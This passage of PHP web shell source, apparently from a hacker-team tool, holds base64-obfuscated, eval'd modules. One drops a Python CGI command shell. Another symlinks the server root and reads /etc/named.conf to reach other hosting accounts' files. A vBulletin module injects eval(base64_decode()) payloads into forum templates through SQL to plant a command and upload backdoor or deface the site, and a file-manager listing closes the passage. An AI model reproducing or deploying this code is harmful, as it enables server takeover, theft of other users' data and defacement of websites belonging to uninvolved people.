ICggJGRvZHkgLCAkbWV0aW4gKSA7CiAgICAgICAgZmNsb3NlICgkZG9keSk7CiRweXRob25wID0gJ0l5RXZkWE55TDJKcGJpOXdlWFJvYjI0S0l5QXdOeTB3Tnkwd05Bb2pJSFl4TGpBdU1Bb0tJeUJqWjJrdGMyaGxiR3d1Y0hrS0l5QkIKSUhOcGJYQnNaU0JEUjBrZ2RHaGhkQ0JsZUdWamRYUmxjeUJoY21KcGRISmhjbmtnYzJobGJHd2dZMjl0YldGdVpITXVDZ29LSXlCRApiM0I1Y21sbmFIUWdUV2xqYUdGbGJDQkdiMjl5WkFvaklGbHZkU0JoY21VZ1puSmxaU0IwYnlCdGIyUnBabmtzSUhWelpTQmhibVFnCmNtVnNhV05sYm5ObElIUm9hWE1nWTI5a1pTNEtDaU1nVG04Z2QyRnljbUZ1ZEhrZ1pYaHdjbVZ6Y3lCdmNpQnBiWEJzYVdWa0lHWnYKY2lCMGFHVWdZV05qZFhKaFkza3NJR1pwZEc1bGMzTWdkRzhnY0hWeWNHOXpaU0J2Y2lCdmRHaGxjbmRwYzJVZ1ptOXlJSFJvYVhNZwpZMjlrWlM0dUxpNEtJeUJWYzJVZ1lYUWdlVzkxY2lCdmQyNGdjbWx6YXlBaElTRUtDaU1nUlMxdFlXbHNJRzFwWTJoaFpXd2dRVlFnClptOXZjbVFnUkU5VUlHMWxJRVJQVkNCMWF3b2pJRTFoYVc1MFlXbHVaV1FnWVhRZ2QzZDNMblp2YVdSemNHRmpaUzV2Y21jdWRXc3YKWVhSc1lXNTBhV0p2ZEhNdmNIbDBhRzl1ZFhScGJITXVhSFJ0YkFvS0lpSWlDa0VnYzJsdGNHeGxJRU5IU1NCelkzSnBjSFFnZEc4ZwpaWGhsWTNWMFpTQnphR1ZzYkNCamIyMXRZVzVrY3lCMmFXRWdRMGRKTGdvaUlpSUtJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXdvaklFbHRjRzl5ZEhNS2RISjUKT2dvZ0lDQWdhVzF3YjNKMElHTm5hWFJpT3lCaloybDBZaTVsYm1GaWJHVW9LUXBsZUdObGNIUTZDaUFnSUNCd1lYTnpDbWx0Y0c5eQpkQ0J6ZVhNc0lHTm5hU3dnYjNNS2MzbHpMbk4wWkdWeWNpQTlJSE41Y3k1emRHUnZkWFFLWm5KdmJTQjBhVzFsSUdsdGNHOXlkQ0J6CmRISm1kR2x0WlFwcGJYQnZjblFnZEhKaFkyVmlZV05yQ21aeWIyMGdVM1J5YVc1blNVOGdhVzF3YjNKMElGTjBjbWx1WjBsUENtWnkKYjIwZ2RISmhZMlZpWVdOcklHbHRjRzl5ZENCd2NtbHVkRjlsZUdNS0NpTWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNagpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1LSXlCamIyNXpkR0Z1ZEhNS0NtWnZiblJzCmFXNWxJRDBnSnp4R1QwNVVJRU5QVEU5U1BTTTBNalF5TkRJZ2MzUjViR1U5SW1admJuUXRabUZ0YVd4NU9uUnBiV1Z6TzJadmJuUXQKYzJsNlpUb3hNbkIwT3lJK0p3cDJaWEp6YVc5dWMzUnlhVzVuSUQwZ0oxWmxjbk5wYjI0Z01TNHdMakFnTjNSb0lFcDFiSGtnTWpBdwpOQ2NLQ21sbUlHOXpMbVZ1ZG1seWIyNHVhR0Z6WDJ0bGVTZ2lVME5TU1ZCVVgwNUJUVVVpS1RvS0lDQWdJSE5qY21sd2RHNWhiV1VnClBTQnZjeTVsYm5acGNtOXVXeUpUUTFKSlVGUmZUa0ZOUlNKZENtVnNjMlU2Q2lBZ0lDQnpZM0pwY0hSdVlXMWxJRDBnSWlJS0NrMUYKVkVoUFJDQTlJQ2NpVUU5VFZDSW5DZ29qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNagpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakNpTWdVSEpwZG1GMFpTQm1kVzVqZEdsdmJuTWdZVzVrSUhaaGNtbGhZbXhsCmN3b0taR1ZtSUdkbGRHWnZjbTBvZG1Gc2RXVnNhWE4wTENCMGFHVm1iM0p0TENCdWIzUndjbVZ6Wlc1MFBTY25LVG9LSUNBZ0lDSWkKSWxSb2FYTWdablZ1WTNScGIyNHNJR2RwZG1WdUlHRWdRMGRKSUdadmNtMHNJR1Y0ZEhKaFkzUnpJSFJvWlNCa1lYUmhJR1p5YjIwZwphWFFzSUdKaGMyVmtJRzl1Q2lBZ0lDQjJZV3gxWld4cGMzUWdjR0Z6YzJWa0lHbHVMaUJCYm5rZ2JtOXVMWEJ5WlhObGJuUWdkbUZzCmRXVnpJR0Z5WlNCelpYUWdkRzhnSnljZ0xTQmhiSFJvYjNWbmFDQjBhR2x6SUdOaGJpQmlaU0JqYUdGdVoyVmtMZ29nSUNBZ0tHVXUKWnk0Z2RHOGdjbVYwZFhKdUlFNXZibVVnYzI4Z2VXOTFJR05oYmlCMFpYTjBJR1p2Y2lCdGFYTnphVzVuSUd0bGVYZHZjbVJ6SUMwZwpkMmhsY21VZ0p5Y2dhWE1nWVNCMllXeHBaQ0JoYm5OM1pYSWdZblYwSUhSdklHaGhkbVVnZEdobElHWnBaV3hrSUcxcGMzTnBibWNnCmFYTnVKM1F1S1NJaUlnb2dJQ0FnWkdGMFlTQTlJSHQ5Q2lBZ0lDQm1iM0lnWm1sbGJHUWdhVzRnZG1Gc2RXVnNhWE4wT2dvZ0lDQWcKSUNBZ0lHbG1JRzV2ZENCMGFHVm1iM0p0TG1oaGMxOXJaWGtvWm1sbGJHUXBPZ29nSUNBZ0lDQWdJQ0FnSUNCa1lYUmhXMlpwWld4awpYU0E5SUc1dmRIQnlaWE5sYm5RS0lDQWdJQ0FnSUNCbGJITmxPZ29nSUNBZ0lDQWdJQ0FnSUNCcFppQWdkSGx3WlNoMGFHVm1iM0p0ClcyWnBaV3hrWFNrZ0lUMGdkSGx3WlNoYlhTazZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQmtZWFJoVzJacFpXeGtYU0E5SUhSb1pXWnYKY20xYlptbGxiR1JkTG5aaGJIVmxDaUFnSUNBZ0lDQWdJQ0FnSUdWc2MyVTZDaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQjJZV3gxWlhNZwpQU0J0WVhBb2JHRnRZbVJoSUhnNklIZ3VkbUZzZFdVc0lIUm9aV1p2Y20xYlptbGxiR1JkS1NBZ0lDQWdJeUJoYkd4dmQzTWdabTl5CklHeHBjM1FnZEhsd1pTQjJZV3gxWlhNS0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUdSaGRHRmJabWxsYkdSZElEMGdkbUZzZFdWekNpQWcKSUNCeVpYUjFjbTRnWkdGMFlRb0tDblJvWldadmNtMW9aV0ZrSUQwZ0lpSWlQRWhVVFV3K1BFaEZRVVErUEZSSlZFeEZQbU5uYVMxegphR1ZzYkM1d2VTQXRJR0VnUTBkSklHSjVJRVoxZW5wNWJXRnVQQzlVU1ZSTVJUNDhMMGhGUVVRK0NqeENUMFJaUGp4RFJVNVVSVkkrCkNqeElNVDVYWld4amIyMWxJSFJ2SUdObmFTMXphR1ZzYkM1d2VTQXRJRHhDVWo1aElGQjVkR2h2YmlCRFIwazhMMGd4UGdvOFFqNDgKU1Q1Q2VTQkdkWHA2ZVcxaGJqd3ZRajQ4TDBrK1BFSlNQZ29pSWlJclptOXVkR3hwYm1VZ0t5SldaWEp6YVc5dUlEb2dJaUFySUhabApjbk5wYjI1emRISnBibWNnS3lBaUlpSXNJRkoxYm01cGJtY2diMjRnT2lBaUlpSWdLeUJ6ZEhKbWRHbHRaU2duSlVrNkpVMGdKWEFzCklDVkJJQ1ZrSUNWQ0xDQWxXU2NwS3ljdVBDOURSVTVVUlZJK1BFSlNQaWNLQ25Sb1pXWnZjbTBnUFNBaUlpSThTREkrUlc1MFpYSWcKUTI5dGJXRnVaRHd2U0RJK0NqeEdUMUpOSUUxRlZFaFBSRDFjSWlJaUlpQXJJRTFGVkVoUFJDQXJJQ2NpSUdGamRHbHZiajBpSnlBcgpJSE5qY21sd2RHNWhiV1VnS3lBaUlpSmNJajRLUEdsdWNIVjBJRzVoYldVOVkyMWtJSFI1Y0dVOWRHVjRkRDQ4UWxJK0NqeHBibkIxCmRDQjBlWEJsUFhOMVltMXBkQ0IyWVd4MVpUMGlVM1ZpYldsMElqNDhRbEkrQ2p3dlJrOVNUVDQ4UWxJK1BFSlNQaUlpSWdwaWIyUjUKWlc1a0lEMGdKend2UWs5RVdUNDhMMGhVVFV3K0p3cGxjbkp2Y20xbGMzTWdQU0FuUEVORlRsUkZVajQ4U0RJK1UyOXRaWFJvYVc1bgpJRmRsYm5RZ1YzSnZibWM4TDBneVBqeENVajQ4VUZKRlBpY0tDaU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qCkl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNakl5TWpJeU1qSXlNS0l5QnRZV2x1SUdKdlpIa2diMllnZEdobElITmoKY21sd2RBb0thV1lnWDE5dVlXMWxYMThnUFQwZ0oxOWZiV0ZwYmw5Zkp6b0tJQ0FnSUhCeWFXNTBJQ0pEYjI1MFpXNTBMWFI1Y0dVNgpJSFJsZUhRdmFIUnRiQ0lnSUNBZ0lDQWdJQ0FqSUhSb2FYTWdhWE1nZEdobElHaGxZV1JsY2lCMGJ5QjBhR1VnYzJWeWRtVnlDaUFnCklDQndjbWx1ZENBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSXlCemJ5QnBjeUIwYUdseklHSnMKWVc1cklHeHBibVVLSUNBZ0lHWnZjbTBnUFNCaloya3VSbWxsYkdSVGRHOXlZV2RsS0NrS0lDQWdJR1JoZEdFZ1BTQm5aWFJtYjNKdApLRnNuWTIxa0oxMHNabTl5YlNrS0lDQWdJSFJvWldOdFpDQTlJR1JoZEdGYkoyTnRaQ2RkQ2lBZ0lDQndjbWx1ZENCMGFHVm1iM0p0CmFHVmhaQW9nSUNBZ2NISnBiblFnZEdobFptOXliUW9nSUNBZ2FXWWdkR2hsWTIxa09nb2dJQ0FnSUNBZ0lIQnlhVzUwSUNjOFNGSSsKUEVKU1BqeENVajRuQ2lBZ0lDQWdJQ0FnY0hKcGJuUWdKenhDUGtOdmJXMWhibVFnT2lBbkxDQjBhR1ZqYldRc0lDYzhRbEkrUEVKUwpQaWNLSUNBZ0lDQWdJQ0J3Y21sdWRDQW5VbVZ6ZFd4MElEb2dQRUpTUGp4Q1VqNG5DaUFnSUNBZ0lDQWdkSEo1T2dvZ0lDQWdJQ0FnCklDQWdJQ0JqYUdsc1pGOXpkR1JwYml3Z1kyaHBiR1JmYzNSa2IzVjBJRDBnYjNNdWNHOXdaVzR5S0hSb1pXTnRaQ2tLSUNBZ0lDQWcKSUNBZ0lDQWdZMmhwYkdSZmMzUmthVzR1WTJ4dmMyVW9LUW9nSUNBZ0lDQWdJQ0FnSUNCeVpYTjFiSFFnUFNCamFHbHNaRjl6ZEdSdgpkWFF1Y21WaFpDZ3BDaUFnSUNBZ0lDQWdJQ0FnSUdOb2FXeGtYM04wWkc5MWRDNWpiRzl6WlNncENpQWdJQ0FnSUNBZ0lDQWdJSEJ5CmFXNTBJSEpsYzNWc2RDNXlaWEJzWVdObEtDZGNiaWNzSUNjOFFsSStKeWtLQ2lBZ0lDQWdJQ0FnWlhoalpYQjBJRVY0WTJWd2RHbHYKYml3Z1pUb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSXlCaGJpQmxjbkp2Y2lCcGJpQmxlR1ZqZFhScGJtY2dkR2hsSUdOdgpiVzFoYm1RS0lDQWdJQ0FnSUNBZ0lDQWdjSEpwYm5RZ1pYSnliM0p0WlhOekNpQWdJQ0FnSUNBZ0lDQWdJR1lnUFNCVGRISnBibWRKClR5Z3BDaUFnSUNBZ0lDQWdJQ0FnSUhCeWFXNTBYMlY0WXlobWFXeGxQV1lwQ2lBZ0lDQWdJQ0FnSUNBZ0lHRWdQU0JtTG1kbGRIWmgKYkhWbEtDa3VjM0JzYVhSc2FXNWxjeWdwQ2lBZ0lDQWdJQ0FnSUNBZ0lHWnZjaUJzYVc1bElHbHVJR0U2Q2lBZ0lDQWdJQ0FnSUNBZwpJQ0FnSUNCd2NtbHVkQ0JzYVc1bENnb2dJQ0FnY0hKcGJuUWdZbTlrZVdWdVpBb0tDaUlpSWdwVVQwUlBMMGxUVTFWRlV3b0tDZ3BEClNFRk9SMFZNVDBjS0NqQTNMVEEzTFRBMElDQWdJQ0FnSUNCV1pYSnphVzl1SURFdU1DNHdDa0VnZG1WeWVTQmlZWE5wWXlCemVYTjAKWlcwZ1ptOXlJR1Y0WldOMWRHbHVaeUJ6YUdWc2JDQmpiMjF0WVc1a2N5NEtTU0J0WVhrZ1pYaHdZVzVrSUdsMElHbHVkRzhnWVNCdwpjbTl3WlhJZ0oyVnVkbWx5YjI1dFpXNTBKeUIzYVhSb0lITmxjM05wYjI0Z2NHVnljMmx6ZEdWdVkyVXVMaTRLSWlJaSc7CgokZmlsZSA9IGZvcGVuKCJweXRob24uaXpvIiAsIncrIik7CiR3cml0ZSA9IGZ3cml0ZSAoJGZpbGUgLGJhc2U2NF9kZWNvZGUoJHB5dGhvbnApKTsKZmNsb3NlKCRmaWxlKTsKICAgIGNobW9kKCJweXRob24uaXpvIiwwNzU1KTsKICBlY2hvICI8L2JyPjxhIGhyZWY9J2J5cGFzcy9weXRob24vcHl0aG9uLml6bycgdGFyZ2V0PSdfYmxhbmsnPiBHbyBUbyBbUHl0aG9uIFNoZWxsXSA+PjwvYT4iOwpicmVhazsKCgp9CmV4aXQ7";
eval(base64_decode($tkl));
exit;
case "symlink":
$tkl = "ICBAc2V0X3RpbWVfbGltaXQoMCk7IEBta2RpcigndGtsJywwNzc3KTsgJElJSUlJSUlJSUlsMSAgPSAiT3B0aW9ucyBhbGwgXG4gRGlyZWN0b3J5SW5kZXggZ2F6YS5odG1sIFxuIEFkZFR5cGUgdGV4dC9wbGFpbiAucGhwIFxuIEFkZEhhbmRsZXIgc2VydmVyLXBhcnNlZCAucGhwIFxuICBBZGRUeXBlIHRleHQvcGxhaW4gLmh0bWwgXG4gQWRkSGFuZGxlciB0eHQgLmh0bWwgXG4gUmVxdWlyZSBOb25lIFxuIFNhdGlzZnkgQW55IjsgJElJSUlJSUlJSUkxSSA9QGZvcGVuICgndGtsLy5odGFjY2VzcycsJ3cnKTsgZndyaXRlKCRJSUlJSUlJSUlJMUkgLCRJSUlJSUlJSUlJbDEpOyAgZWNobyAnICA8YnIgLz48YnIgLz4gPGZvcm0gbWV0aG9kPSJwb3N0Ij4gRmlsZSBQYXRoOjxiciAvPiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZmlsZSIgdmFsdWU9Ii9ob21lL2dhemFoYWNrL3B1YmxpY19odG1sL2NvbmZpZy5waHAiIHNpemU9IjYwIi8+IDxicj5TeW1saW5rIE5hbWU8YnI+IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJzeW1maWxlIiB2YWx1ZT0iZ2F6YS50eHQiIHNpemU9IjYwIi8+PGJyIC8+PGJyIC8+IDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzeW1saW5rIiBuYW1lPSJzeW1saW5rIiAvPiA8YnIgLz48YnIgLz4gPC9mb3JtPiAnOyAkSUlJSUlJSUkxbElsID0gJF9QT1NUWydmaWxlJ107ICRzeW1maWxlID0gJF9QT1NUWydzeW1maWxlJ107ICRzeW1saW5rID0gJF9QT1NUWydzeW1saW5rJ107IGlmICgkc3ltbGluaykgeyBAc3ltbGluaygiJElJSUlJSUlJMWxJbCIsInRrbC8kc3ltZmlsZSIpOyBlY2hvICc8YnIgLz48YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0idGtsLycuJHN5bWZpbGUuJyIgPj09PT4nLiRzeW1maWxlLic8PT09PC9hPic7IH0gIEBzeW1saW5rKCcvJywndGtsL3Jvb3QnKTsgICRJSUlJSUlJSUlsbEkgPSBAZmlsZSgnL2V0Yy9uYW1lZC5jb25mJyk7IGlmKCEkSUlJSUlJSUlJbGxJKSB7IGRpZSAoIiBjYW4ndCByZWFkIC9ldGMvbmFtZWQuY29uZiIpOyB9IGVsc2UgeyAgICAgZWNobyAiPGRpdiBjbGFzcz0ndG1wJz48dGFibGUgIHdpZHRoPSc0MCUnPjx0ZD5Eb21haW5zPC90ZD48dGQ+VXNlcnMgJiBzeW1saW5rPC90ZD4iOyBmb3JlYWNoKCRJSUlJSUlJSUlsbEkgYXMgJElJSUlJSUlJSWxsMSl7IGlmKGVyZWdpKCd6b25lJywkSUlJSUlJSUlJbGwxKSl7IHByZWdfbWF0Y2hfYWxsKCcjem9uZSAiKC4qKSIjJywkSUlJSUlJSUlJbGwxLCRJSUlJSUlJSUlsMTEpOyBmbHVzaCgpOyBpZihzdHJsZW4odHJpbSgkSUlJSUlJSUlJbDExWzFdWzBdKSkgPjIpeyAkSUlJSUlJSUlJMUkxID0gcG9zaXhfZ2V0cHd1aWQoQGZpbGVvd25lcignL2V0Yy92YWxpYXNlcy8nLiRJSUlJSUlJSUlsMTFbMV1bMF0pKTsgJElJSUlJSUlJMUkxbCA9ICRJSUlJSUlJSUkxSTFbJ25hbWUnXSA7IEBzeW1saW5rKCcvJywndGtsL3Jvb3QnKTsgJElJSUlJSUlJMUkxbCA9ICRJSUlJSUlJSUlsMTFbMV1bMF07IGVjaG8gIiA8dHI+IDx0ZD4gPGRpdiBjbGFzcz0nZG9tJz48YSB0YXJnZXQ9J19ibGFuaycgaHJlZj1odHRwOi8vd3d3LiIuJElJSUlJSUlJSWwxMVsxXVswXS4iLz4iLiRJSUlJSUlJSTFJMWwuIiA8L2E+IDwvZGl2PiA8L3RkPiA8dGQ+IDxhIGhyZWY9J3RrbC9yb290L2hvbWUvIi4kSUlJSUlJSUlJMUkxWyduYW1lJ10uIi9wdWJsaWNfaHRtbCcgdGFyZ2V0PSdfYmxhbmsnPiIuJElJSUlJSUlJSTFJMVsnbmFtZSddLiI8L2E+ICA8L3RkPiA8L3RyPjwvZGl2PiAiOyBmbHVzaCgpOyB9IH0gfSB9";
eval(base64_decode($tkl));
exit;
case "vBulletin-Tool":
echo '<form method="GET">Select Tool : <br><p>
			<select name="tool">
				<option value="Inject">Shell Inject</option>
				<option value="VBindex">Change index</option>
								</select>
			<input type="submit" value=">>" />
		
			</p>
		</form>';
exit;
case "Inject":
echo '
Shell Inject</b></p>';
if (empty($_POST[db])){
print '
<form name="frm" action="" method="POST" onsubmit="document.frm.code.value = encode64(document.frm.code.value)">
<br>
Inject To :<br><select size="1" name="template">
<option value="FAQ">FAQ.PHP</option>
<option value="FORUMHOME">FORUMHOME</option>
<option value="search_forums">search forums</option>
<option value="SHOWGROUPS">SHOWGROUPS</option>
<option value="SHOWTHREAD">SHOWTHREAD.PHP</option>
<option value="CALENDAR">CALENDAR.PHP</option>
<option value="MEMBERINFO">MEMBERINFO</option>
<option value="footer">footer</option>
<option value="header">header</option>
<option value="headinclude">headinclude</option>
<option value="lostpw">lostpw</option>
<option value="memberlist">memberlist</option></select></p>
<br> Host : <br><input name="lo" type="text" value="localhost" align="LEFT" size="18"> 
<br>DataBase Name: <br><input name="db" type="text"  align="LEFT" size="18" >
<br>User Name :<br><input name="user" type="text"  align="LEFT" size="15" >
<br>Password :<br><input name="pass" type="text"  align="MIDDLE" size="15" >
<br>Table Prefix :<br><input name="tab" type="text"  align="LEFT" size="15" >
<br><input type="submit" value="Inject"/>';
}else{
$a ="{\${eval(base64_decode(\'";
$code ='JGNvZGUgPSAnUEQ4Z0lHbG1JQ2drWkdseUlEMDlJQ2NuS1hzZ0pHUnBjaUE5SUdkbGRHTjNaQ2dwT3lCOUlHbG1JQ2drWDFCUFUxUmJKMk52YlcxaGJtUW5YU0FoUFNBbkp5bDdJQ1JsZUdWalgzUjVjR1U5SkY5UVQxTlVXeWRsZUdWamRYUmxYM1I1Y0dVblhUc2dKR052YlQwa1gxQlBVMVJiSjJOdmJXMWhibVFuWFRzZ1pXTm9ieUFrWTI5dE95QnBaaUFvYVhOelpYUW9KR1Y0WldOZmRIbHdaU2twSUhzZ2FXWWdLQ1JsZUdWalgzUjVjR1U5UFNJeElpa2dleUJsWTJodklITm9aV3hzWDJWNFpXTW9KR052YlNrN0lIMGdaV3h6WldsbUtDUmxlR1ZqWDNSNWNHVTlQU0l5SWlrZ2V5QmxZMmh2SUhONWMzUmxiU2drWTI5dEtUc2dJSDBnWld4elpXbG1JQ2drWlhobFkxOTBlWEJsUFQwaU15SXBJSHNnY0dGemMzUm9jblVvSkdOdmJTazdJSDBnWld4elpXbG1JQ2drWlhobFkxOTBlWEJsUFQwaU5DSXBJSHNnYVdZZ0tHWjFibU4wYVc5dVgyVjRhWE4wY3loemFHVnNiRjlsZUdWaktTa2dleUJsWTJodklITm9aV3hzWDJWNFpXTW9KR052YlNrN0lIMGdaV3h6WldsbUlDaG1kVzVqZEdsdmJsOWxlR2x6ZEhNb2MzbHpkR1Z0S1NrZ2V5QmxZMmh2SUhONWMzUmxiU2drWTI5dEtUc2dmU0JsYkhObGFXWWdLR1oxYm1OMGFXOXVYMlY0YVhOMGN5aHdZWE56ZEdoeWRTa3BJSHNnWldOb2J5QndZWE56ZEdoeWRTZ2tZMjl0S1RzZ2ZTQmxiSE5sSUhzZ1pXTm9ieUFpV3kxZFNTQmpZVzRnYm05MElFVjRaV04xZEdVZ1lXNTVJR052YlcxaGJtUWlPeUI5SUNBZ0lDQjlJSDBnSUgwZ2FXWWdLQ0ZsYlhCMGVTQW9KRjlHU1V4RlUxc25aMkY2WVZWUUoxMHBLU0I3SUNBZ0lDQnRiM1psWDNWd2JHOWhaR1ZrWDJacGJHVW9KRjlHU1V4RlUxc25aMkY2WVZWUUoxMWJKM1J0Y0Y5dVlXMWxKMTBzSkdScGNpNG5MeWN1SkY5R1NVeEZVMXNuWjJGNllWVlFKMTFiSjI1aGJXVW5YU2s3SUNBZ0lDQWtaMkY2WVY5MFpYaDBJRDBnSWp4aVBsVndiRzloWkdWa0lGTjFZMk5sYzNObWRXeHNlVHd2WWo0OFluSStabWxzWlNCdVlXMWxJRG9nSWk0a1gwWkpURVZUV3lkbllYcGhWVkFuWFZzbmJtRnRaU2RkTGlJOFluSStabWxzWlNCemFYcGxJRG9nSWk0a1gwWkpURVZUV3lkbllYcGhWVkFuWFZzbmMybDZaU2RkTGlJOFluSStabWxzWlNCMGVYQmxJRG9nSWk0a1gwWkpURVZUV3lkbllYcGhWVkFuWFZzbmRIbHdaU2RkTGlJOFluSStJanNnZlNCbFkyaHZKendoTFMwZ1JYaGxZM1YwWlNBdUwzUnJiQzB0UGlBSkNUeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlENEpDUWs4Y0Q0Z0NRa0pQR2x1Y0hWMElIUjVjR1U5SW5SbGVIUWlJRzVoYldVOUltTnZiVzFoYm1RaUlDOCtJQWtKQ1R4elpXeGxZM1FnYm1GdFpUMGlaWGhsWTNWMFpWOTBlWEJsSWo0Z0NRa0pDVHh2Y0hScGIyNGdkbUZzZFdVOU5ENUJkWFJ2SUZObGJHVmpkRHd2YjNCMGFXOXVQaUFKQ1FrSlBHOXdkR2x2YmlCMllXeDFaVDB4UG5Ob1pXeHNJR1Y0WldNOEwyOXdkR2x2Ymo0Z0NRa0pDVHh2Y0hScGIyNGdkbUZzZFdVOU1qNXplWE4wWlcwOEwyOXdkR2x2Ymo0Z0NRa0pDVHh2Y0hScGIyNGdkbUZzZFdVOU16NXdZWE56ZEdoeWRUd3ZiM0IwYVc5dVBpQUpDUWtKQ1FrSkNUd3ZjMlZzWldOMFBpQUpDUWs4YVc1d2RYUWdkSGx3WlQwaWMzVmliV2wwSWlCMllXeDFaVDBpUlhobFkzVjBaU0lnTHo0Z0NTQUpDUWs4TDNBK0lBa0pQQzltYjNKdFBpQThJUzB0SUdWdVpDQkZlR1ZqZFhSbElDNHZkR3RzTFMwK0p6c2daV05vYnlBaVBDRXRMWFZ3Ykc5aFpDQm1hV3hsSUM0dmRHdHNMUzArSUR4c1pXWjBQaUE4Wm05eWJTQnRaWFJvYjJROUoxQlBVMVFuSUdWdVkzUjVjR1U5SjIxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFblBpQThhVzV3ZFhRZ2RIbHdaVDBuWm1sc1pTY2dibUZ0WlQwbloyRjZZVlZRSnlCemFYcGxQU2N5TXljZ1BpQThhVzV3ZFhRZ2RIbHdaVDBuYzNWaWJXbDBKeUIyWVd4MVpUMG5WWEJzYjJGa0p5QnphWHBsUFNjek5TY2dQaUE4TDJadmNtMCtJRHd2YkdWbWRENGdQQ0V0TFNCbGJtUWdkWEJzYjJGa0lHWnBiR1VnTGk5MGEyd3RMVDRpT3lCbFkyaHZJQ1JuWVhwaFgzUmxlSFE3SUdWamFHOGdKenhqWlc1MFpYSStQR0VnYUhKbFpqMGlhSFIwY0RvdkwyZGhlbUV0YUdGamEyVnlMbTVsZENJZ2RHRnlaMlYwUFNKZllteGhibXNpUGx0SFlYcGhJRWhoUTB0bFVpQlVaV0Z0WFR3dllUNGdMU0E4WVNCb2NtVm1QU0pvZEhSd09pOHZaMkY2WVMxb1lXTnJaWEl1Ym1WMEwyTmpMMjFsYldKbGNpMTFYekl5TXpZeExtaDBiV3dpSUhSaGNtZGxkRDBpWDJKc1lXNXJJajViVkV0TVhUd3ZZVDQ4TDJObGJuUmxjajRuT3lBZ1B6ND0nOyAkZnAgPSBmb3BlbigiZ2F6YTMtdmIucGhwIiwidysiKTsgZndyaXRlKCRmcCxiYXNlNjRfZGVjb2RlKCRjb2RlKSk7IGhlYWRlcigiTG9jYXRpb246IGdhemEzLXZiLnBocCIpOw==';
$template =$_POST['template'];
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$p = "UPDATE ".$_POST[tab]."template SET template ='".$a.$code."\'))}}{\${exit()}}&' WHERE title ='".$template."'";
$ka= @mysql_query($p) or die(mysql_error());
if ($ka){print'Success <br> Shell Injected in '.$template;}
}
print $f;

exit;
case "VBindex":
if (!$_POST[code]){
print '
<form name="frm" action="" method="POST" onsubmit="document.frm.code.value = vb(document.frm.code.value)">
Change index BY:<br><select size="1" name="t">
<option value="spacer_open">SPACER_OPEN</option>
<option value="spacer_close">SPACER_CLOSE</option>
</select></p>
<br> Host :<br><input name="lo" type="text" value="localhost" align="LEFT" size="18"/> 
<br>DataBase Name: <br><input name="db" type="text"  align="LEFT" size="18" ><Br>
<br>User Name :<br><input name="user" type="text"  align="LEFT" size="15">
<br>Password :<br><input name="pass" type="text" align="MIDDLE" size="15">
<br>Table Prefix :<br><input name="tab" type="text" align="LEFT" size="15">
<br>index code[HTML]<br><textarea name="code" cols="41" rows="15" wrap="VIRTUAL" ></textarea><br>
<input type="submit" value="Change index" />';
}else{
 $lost = $_POST[t];
 $a ="{\${eval(base64_decode(\'";
 $tkl_index = base64_encode('echo "'.$_POST[code].'</body></html>";exit;');
@mysql_connect($_POST['lo'],$_POST['user'],$_POST['pass']) or die(mysql_error());      
@mysql_select_db($_POST['db']) or die(mysql_error());
$p = "UPDATE ".$_POST[tab]."template SET template ='".$a.$tkl_index."\'))}}' WHERE title ='".$lost."'";
$ka= @mysql_query($p) or die(mysql_error());
if ($ka){print"Success ";}
}
print $f;
exit;
}
}
function dirTKL ($dir) {
echo '<table><tr><td><u>filename</u></td><td><u>|</u></td><td><u></u></td><tr><td><textarea name="code" cols="20" rows="20" wrap="VIRTUAL">';
foreach (glob("$dir/*.*") as $filename) {
    $filename= str_replace("$dir/", "", $filename);
		echo $filename.PHP_EOL;
	}
echo '</textarea></td></tr></table>';
}
hidTKL ();
if (!$_GET['tool'] == ''){
toolTKL ();
}
if ($_GET['tool'] == 'Files'){
function getlist ($directory) {
	global $delim, $win;
	if ($d = @opendir($directory)) {
		while (($filename = @readdir($d)) !== false) {
			$path = $directory . $filename;
			if ($stat = @lstat($path)) {
				$file = array(
					'filename'    => $filename,
					'path'        => $path,
					'is_file'     => @is_file($path),
					'is_dir'      => @is_dir($path),
					'is_link'     => @is_link($path),
					'is_readable' => @is_readable($path),
					'is_writable' => @is_writable($path),
					'size'        => $stat['size'],
					'permission'  => $stat['mode'],
					'owner'       => $stat['uid'],
					'group'       => $stat['gid'],
					'mtime'       => @filemtime($path),
					'atime'       => @fileatime($path),
					'ctime'       => @filectime($path)
				);
				if ($file['is_dir']) {
					$file['is_executable'] = @file_exists($path . $delim . '.');
				} else {
					if (!$win) {
						$file['is_executable'] = @is_executable($path);
					} else {
						$file['is_executable'] = true;
					}
				}
				if ($file['is_link']) $file['target'] = @readlink($path);
				if (function_exists('posix_getpwuid')) $file['owner_name'] = @reset(posix_getpwuid($file['owner']));
				if (function_exists('posix_getgrgid')) $file['group_name'] = @reset(posix_getgrgid($file['group']));
				$files[] = $file;
			}
		}
		return $files;
	} else {
		return false;
	}
}
function sortlist (&$list, $key, $reverse) {
	quicksort($list, 0, sizeof($list) - 1, $key);
	if ($reverse) $list = array_reverse($list);
}
function quicksort (&$array, $first, $last, $key) {
	if ($first < $last) {
